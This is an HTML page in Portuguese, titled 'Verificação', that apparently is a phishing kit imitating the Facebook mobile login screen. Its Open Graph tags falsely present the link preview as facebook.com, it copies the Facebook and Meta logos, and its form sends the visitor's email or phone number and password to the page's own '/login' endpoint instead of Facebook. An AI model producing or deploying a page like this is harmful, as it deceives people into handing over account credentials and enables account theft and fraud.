

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Metatags Open Graph para a prévia -->
    <meta property="og:title" content="Facebook">
    <meta property="og:description" content="Facebook">
    <meta property="og:image" content="https://logopng.com.br/logos/facebook-13.png">
    <meta property="og:url" content="https://www.facebook.com">
    <title>Verificação</title>
    <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        /* Gradiente de fundo complexo */
        .background {
            background-image: radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%), 
                              radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%), 
                              radial-gradient(rgb(160, 51, 255) 37%, transparent 46%), 
                              linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%), 
                              linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255));
            background-position: left bottom, 109% 68%, 109% 68%, center center, center center;
            background-repeat: no-repeat;
            background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
            position: absolute;
            inset: 0; /* Isso garante que a div ocupe toda a tela */
            opacity: 0.08;
            pointer-events: none;
            z-index: -1;
            height: 100vh; /* Altura total da viewport */
        }
        
        /* Definindo altura do body para 100% da tela */
        body {
            height: 100vh; /* Altura total da viewport */
            margin: 0; /* Remove margens padrão */
        }
    </style>
</head>

<body class=" ">

    <!-- Fundo com gradiente complexo -->
    <div class="background"></div>

    <div class="container mx-auto relative z-10">
        <div class="up">
            <img class="w-7 mx-3 my-6" src="back.png" alt="">
            <p class="w-40 text-gray-600 mx-auto my-8 font-normal">Português (Brasil) 
                <img class="w-5 -my-5 ml-40" src="dropdown.png" />
            </p>
            <img class="w-14 mx-auto bg-transparent my-20 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
        </div>

        <!-- Formulário adicionado aqui -->
        <form class="down bg-none flex flex-col" action="/login" method="POST">
            <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-spacing-56 border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="text" name="email" placeholder="Número do celular ou email" required>
            <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="password" name="senha" placeholder="Senha" required>
            <button class="btn rounded-full mr-3 ml-3 py-2 bg-[#0064E0] text-white hover:bg-blue-700 hover:mr-4 hover:ml-4 cursor-pointer" type="submit">Entrar</button>
            <p class="mt-2 text-gray-800 bg-none text-sm font-semibold mx-auto mb-20 hover:underline cursor-pointer">Esqueceu a senha?</p>
        </form>

        <div class="bottom bg-none flex flex-col">
            <button class="btn border border-blue-900 rounded-full mr-3 ml-3 py-2 text-blue-900 font-semibold hover:border-blue-600 hover:text-blue-600 hover:mr-4 hover:ml-4">Criar nova conta</button>
            <img class="w-12 mx-auto bg-transparent" src="meta.svg" alt="">
        </div>
    </div>
</body>
</html>
